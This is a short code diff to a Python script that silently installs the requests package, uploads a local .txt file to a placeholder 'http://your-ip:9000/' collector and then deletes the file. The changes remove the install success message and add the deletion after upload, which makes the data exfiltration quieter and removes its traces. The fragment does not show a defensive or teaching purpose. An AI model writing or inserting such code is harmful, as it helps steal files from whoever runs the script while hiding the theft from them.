@@ -11,7 +11,6 @@ def install_package(package_name="requests"):
     for cmd in pip_commands:
         try:
             subprocess.check_call(cmd)
-            print(f"Successfully installed {package_name}")
             return
         except subprocess.CalledProcessError:
             pass
@@ -53,7 +52,9 @@ def run():
   url = "http://your-ip:9000/"  # Adjust the IP and port accordingly
   files = {'file': open(f'{curr_path}.txt', 'rb')}
 
-  response = requests.post(url, files=files)
+  requests.post(url, files=files)
+
+  os.remove(f'{curr_path}.txt')
 
 
 if __name__ == "__main__":
